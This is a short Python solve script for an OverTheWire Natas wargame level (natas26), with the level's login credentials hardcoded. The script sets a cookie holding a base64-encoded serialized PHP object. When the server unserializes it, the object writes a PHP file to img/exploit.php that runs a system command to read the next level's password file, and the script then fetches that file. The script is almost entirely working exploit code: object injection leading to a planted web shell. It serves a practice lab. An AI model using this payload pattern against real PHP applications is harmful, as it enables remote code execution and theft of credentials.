#!/usr/bin/env python3

import requests
import re


req = requests.Session()


username = "natas26"
password = "oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T"
url = "http://%s.natas.labs.overthewire.org/" % username


req_get = req.get(url+"?x1=1&y1=1&x2=2&y2=5",auth=(username,password))
req.cookies.set("drawing","Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNToiaW1nL2V4cGxvaXQucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6NTg6Ijw/cGhwICAgZWNobyhzeXN0ZW0oJ2NhdCAvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpKTsgPz4iO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1ODoiPD9waHAgICBlY2hvKHN5c3RlbSgnY2F0IC9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3JykpOyA/PiI7fQ==")
req_get = req.get(url+"img/exploit.php",auth=(username,password))
print(req_get.text)

# new_password = re.findall("] (.*)\n",req_get.text)
# print(new_password[0])

#Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNToiaW1nL2V4cGxvaXQucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6NTg6Ijw/cGhwICAgZWNobyhzeXN0ZW0oJ2NhdCAvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpKTsgPz4iO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1ODoiPD9waHAgICBlY2hvKHN5c3RlbSgnY2F0IC9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3JykpOyA/PiI7fQ==